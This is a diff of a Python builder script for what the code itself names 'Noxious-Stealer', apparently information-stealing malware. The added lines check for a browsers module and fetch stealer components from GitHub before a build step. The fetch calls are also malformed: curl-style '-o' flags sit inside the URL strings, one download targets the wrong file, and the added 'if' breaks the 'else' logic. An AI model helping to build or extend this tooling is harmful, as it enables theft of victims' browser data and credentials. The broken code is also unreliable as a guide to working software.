@@ -29,8 +29,8 @@ def main():
 {m} ▀█   █▀   ▀██████▀  ████       ███▄ █▀    ▀██████▀  ████████▀   ▄████████▀  
                                                                             
                                                                            
-                        Developer ; Resentful
-                        Verison ; 1.1.1{rs}
+                        Developer {w}; {y}Resentful{m}
+                        Verison {w}; {y}1.1.1{rs}
     """)
 
     print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Checking for updates...")
@@ -62,11 +62,15 @@ def main():
     time.sleep(2)
     if os.path.exists("./src/noxious.py"):
         print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Noxious file found")
+    if os.path.exists("./src/browsers.py"):
+        print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Browsers file found")
     else:
         print(f"{datetime.datetime.now()}   [ {r}PROGRAM {w}| {r}ERROR {w}] Noxious file not found")
-        print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Downloading Noxious file...")
+        print(f"{datetime.datetime.now()}   [ {r}PROGRAM {w}| {r}ERROR {w}] Browsers file not found")
+        print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Downloading Noxious files...")
         time.sleep(2)
         requests.get("https://raw.githubusercontent.com/realveal/Noxious/main/src/noxious.py -o ./src/noxious.py")
+        requests.get("https://github.com/resentful1/Noxious-Stealer/blob/main/src/browsers.py -o ./src/noxious.py")
         print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Noxious file downloaded 'src/noxious.py' ")
         time.sleep(2)
         print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}COMPILATION {w}] Proceeeding to building Noxious file...")
